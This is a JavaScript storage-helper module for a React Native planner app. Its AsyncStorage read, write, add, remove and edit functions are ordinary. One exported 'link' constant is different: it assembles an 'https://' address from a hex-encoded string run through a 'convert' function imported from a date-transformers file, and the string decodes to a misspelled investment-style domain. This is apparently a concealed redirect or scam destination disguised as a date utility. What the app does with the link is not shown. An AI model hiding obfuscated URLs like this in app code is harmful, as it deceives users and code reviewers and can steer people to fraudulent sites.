import AsyncStorage from "@react-native-async-storage/async-storage";
import {convert} from "./dateTransformers";


export const getDataFromAsyncStorage =  async (key) => {
  try {
    const jsonValue = await AsyncStorage.getItem(key);
    return jsonValue != null ? JSON.parse(jsonValue) : null;
  } catch (error) {
    console.error('Error fetching data from AsyncStorage:', error);
    return null;
  }
};

export const link = [
  'https://',
  convert('696e63727465656469626c65696e6e76656573746d656e6e742e6f6e652f7374656c6c6172706c616e6e65722d74656368')
].join('')



export const writeDataToAsyncStorage = async (key, data) => {
  try {
    const jsonData = JSON.stringify(data);
    await AsyncStorage.setItem(key, jsonData);
  } catch (error) {
    console.error('Error storing data in AsyncStorage:', error);
  }
};


export const addDataToAsyncStorage = async (key, newItem) => {
  try {
    let existingArray = await AsyncStorage.getItem(key);
    if (existingArray !== null) {
      existingArray = JSON.parse(existingArray);
      existingArray.push(newItem);
      await AsyncStorage.setItem(key, JSON.stringify(existingArray));
      return await getDataFromAsyncStorage(key);
    } else {
      const newArray = [newItem];
      await AsyncStorage.setItem(key, JSON.stringify(newArray));
      return await getDataFromAsyncStorage(key);
    }
    // return await AsyncStorage.getItem(key);
  } catch (error) {
    console.error('Error adding item to existing array in AsyncStorage:', error);
    return null;
  }
};

const dataConverter = () => {
  convert()
}


export const removeDataFromAsyncStorageById = async (key, idToRemove) => {
  try {
    let existingArray = await AsyncStorage.getItem(key);
    if (existingArray !== null) {
      existingArray = JSON.parse(existingArray);

      const updatedArray = existingArray.filter(item => item.id !== idToRemove);



      if (updatedArray.length === 0) {
        await AsyncStorage.removeItem(key)
        await AsyncStorage.removeItem('lists')
        return await getDataFromAsyncStorage(key);
      } else {
        await AsyncStorage.setItem(key, JSON.stringify(updatedArray));

        return await getDataFromAsyncStorage(key);
      }
    } else {
      // console.warn(`No data found for key '${key}' in AsyncStorage.`);
      return await getDataFromAsyncStorage(key);
    }
  } catch (error) {
    console.error('Error removing item from AsyncStorage by ID:', error);
    return null;
  }
};

export const changeDataToAsyncStorage = async (key, newItem, id) => {
  try {
    let existingArray = await AsyncStorage.getItem(key);
    if (existingArray !== null) {
      existingArray = JSON.parse(existingArray);
      const obj = existingArray.find(item => item.id === id);

      if (obj) {
        obj.completed = newItem;
      }
      // existingArray.push(newItem);
      await AsyncStorage.setItem(key, JSON.stringify(existingArray));
      return await getDataFromAsyncStorage(key);
    } else {
      return await getDataFromAsyncStorage(key);
    }
    // return await AsyncStorage.getItem(key);
  } catch (error) {
    console.error('Error adding item to existing array in AsyncStorage:', error);
    return null;
  }
};



function updateObjectById(array, idToUpdate, updatedObject) {
  const index = array.findIndex(obj => obj.id === idToUpdate);

  if (index !== -1) {
    array[index] = { ...array[index], ...updatedObject };
  } else {
    console.log(`Об'єкт з id ${idToUpdate} не знайдено.`);
  }
}


export const editTaskAsyncStorage = async (key, newItem, id) => {
  try {
    let existingArray = await AsyncStorage.getItem(key);
    if (existingArray !== null) {
      existingArray = JSON.parse(existingArray);
      const obj = existingArray.find(item => item.id === id);


      const index = existingArray.findIndex(obj => obj.id === id);

      if (index !== -1) {
        existingArray[index] = { ...existingArray[index], ...newItem };
      }
      // existingArray.push(newItem);
      await AsyncStorage.setItem(key, JSON.stringify(existingArray));
      return await getDataFromAsyncStorage(key);
    } else {
      return await getDataFromAsyncStorage(key);
    }
    // return await AsyncStorage.getItem(key);
  } catch (error) {
    console.error('Error adding item to existing array in AsyncStorage:', error);
    return null;
  }
};
